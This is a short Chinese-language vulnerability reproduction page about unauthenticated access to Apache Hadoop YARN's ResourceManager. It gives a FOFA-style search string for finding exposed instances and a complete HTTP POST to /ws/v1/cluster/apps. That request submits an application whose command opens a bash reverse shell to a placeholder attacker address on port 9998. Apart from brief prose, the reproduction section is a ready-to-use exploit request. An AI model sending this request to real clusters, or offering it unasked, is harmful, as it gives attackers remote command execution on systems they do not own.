# Apache Hadoop Yarn RPC 远程命令执行漏洞

## 漏洞描述

 Hadoop Yarn RPC未授权访问漏洞存在于Hadoop Yarn中负责资源管理和任务调度的ResourceManager，成因是该组件为用户提供的RPC服务默认情况下无需认证即可访问，

## 漏洞影响

<a-checkbox checked>Apache Hadoop </a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="APACHE-hadoop-YARN"</a-checkbox></br>

## 漏洞复现

主页面

![img](../../../.vuepress/public/img/1657361631852-75dabea7-851c-4155-973d-79ebcfbf1fd0.png)

验证请求包

```php
POST /ws/v1/cluster/apps HTTP/1.1
Host: 
Accept: */*
Accept-Encoding: gzip, deflate
Content-Length: 215
Content-Type: application/json

{"application-id": "application_1655112607010_0005", "application-name": "get-shell", "am-container-spec": {"commands": {"command": "/bin/bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/9998 0>&1"}}, "application-type": "YARN"}
```

![img](../../../.vuepress/public/img/1657361905195-15771262-fd2e-4c75-ba06-82b1d0ce7aad.png)